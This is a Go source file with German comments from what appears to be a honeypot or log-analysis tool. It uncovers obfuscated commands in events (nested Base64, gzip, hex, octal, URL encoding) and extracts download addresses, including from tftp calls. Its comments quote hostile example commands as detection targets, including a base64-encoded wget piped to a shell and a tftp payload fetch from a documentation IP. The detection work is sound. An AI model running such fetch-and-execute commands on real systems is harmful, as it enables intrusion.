package main

// Verschleierte Inhalte aufdecken. Angreifer verstecken Befehle und Nachlade-Adressen
// gern in Base64 ("echo d2dldCBodHRw... | base64 -d | sh"), in Hex-Escapes
// ("printf '\x77\x67\x65\x74'") oder in URL-Kodierung. revealHidden entschlüsselt
// solche Stellen (auch verschachtelt), damit Muster, Nachlade-Adressen und Bericht
// den eigentlichen Inhalt sehen. Binärdaten (z. B. SSH-Schlüssel) werden verworfen.

import (
	"bytes"
	"compress/gzip"
	"encoding/base64"
	"encoding/hex"
	"io"
	"net/url"
	"regexp"
	"strings"
	"unicode/utf8"
)

var (
	b64Re     = regexp.MustCompile(`[A-Za-z0-9+/_-]{16,}={0,2}`)
	hexEscRe  = regexp.MustCompile(`(?:\\x[0-9a-fA-F]{2}){4,}`)
	pctRe     = regexp.MustCompile(`(?:%[0-9a-fA-F]{2}.*){3,}`)
	octEscRe  = regexp.MustCompile(`(?:\\[0-7]{3}){4,}`)
	hiddenMax = 8 // höchstens so viele Funde je Text
)

// readable: überwiegend druckbarer Text (mindestens 90 % druckbare Zeichen, keine Steuerzeichen außer Leerraum).
func readable(b []byte) bool {
	if len(b) < 6 || !utf8.Valid(b) {
		return false
	}
	good, total := 0, 0
	for _, r := range string(b) {
		total++
		if r == '\n' || r == '\r' || r == '\t' || r >= 0x20 && r != 0x7f && r != utf8.RuneError {
			good++
		}
	}
	return good*10 >= total*9
}

// interesting: lohnt sich die Anzeige? Wörter, Leerzeichen, Pfade oder Adressen, nicht nur Buchstabensalat.
func interesting(s string) bool {
	return strings.ContainsAny(s, " /.;|=:")
}

func decodeB64(tok string) ([]byte, bool) {
	tok = strings.TrimRight(tok, "=")
	for _, enc := range []*base64.Encoding{base64.RawStdEncoding, base64.RawURLEncoding} {
		b, err := enc.DecodeString(tok)
		if err != nil {
			continue
		}
		if g, ok := gunzipSmall(b); ok { // "echo H4sI… | base64 -d | gunzip | sh"
			b = g
		}
		if readable(b) {
			return b, true
		}
	}
	return nil, false
}

// gunzipMax: höchstens so viel entpackter Text je Fund (Schutz vor Packbomben).
const gunzipMax = 256 << 10

// gunzipSmall entpackt gzip-Daten (beginnen mit 1f 8b), höchstens gunzipMax Bytes.
// Abgeschnittene Daten (Befehl gekürzt) liefern, was bis dahin lesbar war.
func gunzipSmall(b []byte) ([]byte, bool) {
	if len(b) < 18 || b[0] != 0x1f || b[1] != 0x8b {
		return nil, false
	}
	zr, err := gzip.NewReader(bytes.NewReader(b))
	if err != nil {
		return nil, false
	}
	out, _ := io.ReadAll(io.LimitReader(zr, gunzipMax))
	return out, len(out) > 0
}

// urlDecoded: so entschlüsselt revealHidden einen Text mit URL-Kodierung (sonst "").
func urlDecoded(s string) string {
	if len(s) > 64<<10 {
		s = s[:64<<10]
	}
	if !pctRe.MatchString(s) {
		return ""
	}
	u, err := url.QueryUnescape(strings.ReplaceAll(s, "+", "%2B"))
	if err != nil || u == s {
		return ""
	}
	return clip(strings.TrimSpace(u), 2000) // wie add in revealHidden
}

// revealHidden liefert die entschlüsselten Inhalte eines Textes (ohne den Text selbst).
func revealHidden(text string) []string {
	var out []string
	seen := map[string]bool{}
	var walk func(s string, depth int)
	add := func(s string, depth int) {
		s = strings.TrimSpace(s)
		if s == "" || seen[s] || len(out) >= hiddenMax || !interesting(s) {
			return
		}
		seen[s] = true
		out = append(out, clip(s, 2000))
		if depth < 3 {
			walk(s, depth+1) // verschachtelt: Base64 in Base64, Hex in Base64 …
		}
	}
	walk = func(s string, depth int) {
		if len(s) > 64<<10 {
			s = s[:64<<10]
		}
		for _, tok := range b64Re.FindAllString(s, 16) {
			// reine Pfade, Hex-Hashes und Wörter überspringen
			if strings.Count(tok, "/") > len(tok)/6 || isHex(tok) {
				continue
			}
			if b, ok := decodeB64(tok); ok {
				add(string(b), depth)
			}
		}
		for _, m := range hexEscRe.FindAllString(s, 8) {
			if b, err := hex.DecodeString(strings.ReplaceAll(m, `\x`, "")); err == nil && readable(b) {
				add(string(b), depth)
			}
		}
		for _, m := range octEscRe.FindAllString(s, 8) {
			var b []byte
			for _, o := range strings.Split(m, `\`)[1:] {
				v := (o[0]-'0')*64 + (o[1]-'0')*8 + (o[2] - '0')
				b = append(b, v)
			}
			if readable(b) {
				add(string(b), depth)
			}
		}
		if pctRe.MatchString(s) {
			if u, err := url.QueryUnescape(strings.ReplaceAll(s, "+", "%2B")); err == nil && u != s && readable([]byte(u)) {
				add(u, depth)
			}
		}
	}
	walk(text, 0)
	return out
}

func isHex(s string) bool {
	for _, c := range s {
		if !(c >= '0' && c <= '9' || c >= 'a' && c <= 'f' || c >= 'A' && c <= 'F') {
			return false
		}
	}
	return true
}

// analysisText: Text eines Ereignisses samt entschlüsselter Inhalte (für Muster und Adressen).
func analysisText(e *Event) (text, on string, revealed []string) {
	text, on = eventText(e)
	if text == "" {
		return
	}
	revealed = analyzeText(text, on).revealed // Zwischenspeicher (analysiscache.go)
	return
}

// matchAll prüft den Text in seiner Gruppe und entschlüsselte Inhalte zusätzlich als Befehle.
// Nur URL-dekodiert ist kein Versteck: Web-Pfade und Parameter sind so kodiert
// ("archive?path=%2Fusr%2Fbin%2F"). Dieser Text wird nur in seiner Gruppe geprüft (sonst
// wäre ".../etc/passwd" der Befehl "passwd") und zählt nicht als Verschleierung.
func matchAll(text, on string, revealed []string) []string {
	ids := matchPatterns(text, on)
	plain := urlDecoded(text)
	hidden := false
	for _, r := range revealed {
		groups := []string{on, "cmd"}
		if r == plain {
			groups = groups[:1]
		} else {
			hidden = true
		}
		for _, g := range groups {
			for _, id := range matchPatterns(r, g) {
				if !contains(ids, id) {
					ids = append(ids, id)
				}
			}
		}
	}
	if hidden && !contains(ids, "obfuscation") {
		ids = append(ids, "obfuscation")
	}
	return ids
}

// urlEscRe findet Adressen auch dann, wenn Backslashes darin stehen: Angreifer verschleiern
// Adressen gern so ("http://ex\\am\\ple.org"); die Shell entfernt die Backslashes beim
// Ausführen. Ohne diese Regel endete die Adresse beim ersten Backslash ("http://ex").
var urlEscRe = regexp.MustCompile(`(?i)\b(?:https?|ftp|tftp)://(?:[^\s'"<>|;)\\]|\\+[^\s'"<>|;)\\])+`)

// allURLs: Adressen im Text und in den entschlüsselten Inhalten (Backslashes entfernt).
func allURLs(text string, revealed []string, max int) []string {
	var out []string
	for _, s := range append([]string{text}, revealed...) {
		for _, u := range append(urlEscRe.FindAllString(s, max), tftpURLs(s)...) {
			u = strings.ReplaceAll(u, `\`, "")
			if !contains(out, u) && len(out) < max {
				out = append(out, u)
			}
		}
	}
	return out
}

// tftpCmdRe: Aufruf von tftp bis zum Ende des Befehls ("tftp -g -r x86 -l q 203.0.113.5").
var tftpCmdRe = regexp.MustCompile(`(?i)\btftp\s+([^;|&\n]{1,300})`)

// tftpURLs macht aus tftp-Aufrufen Adressen (tftp://host/datei). Busybox-tftp nennt die
// Datei mit -r und den Server als letztes Argument; Adressen kennt tftp nicht.
func tftpURLs(s string) []string {
	var out []string
	for _, m := range tftpCmdRe.FindAllStringSubmatch(s, 4) {
		f := strings.Fields(m[1])
		var file, host string
		for i := 0; i < len(f); i++ {
			switch {
			case f[i] == "-r" && i+1 < len(f):
				file = f[i+1]
				i++
			case (f[i] == "-l" || f[i] == "-b") && i+1 < len(f):
				i++
			case strings.HasPrefix(f[i], "-"):
			default:
				host = f[i] // letztes freies Argument (ein Port dahinter wäre nur Zahl)
				if i+1 < len(f) && isDigits(f[i+1]) {
					i++
				}
			}
		}
		host = strings.Trim(host, `'"`)
		if file == "" || host == "" || isDigits(host) || !strings.ContainsAny(host, ".:") {
			continue
		}
		out = append(out, "tftp://"+host+"/"+strings.TrimPrefix(strings.Trim(file, `'"`), "/"))
	}
	return out
}

func isDigits(s string) bool {
	for _, c := range s {
		if c < '0' || c > '9' {
			return false
		}
	}
	return s != ""
}
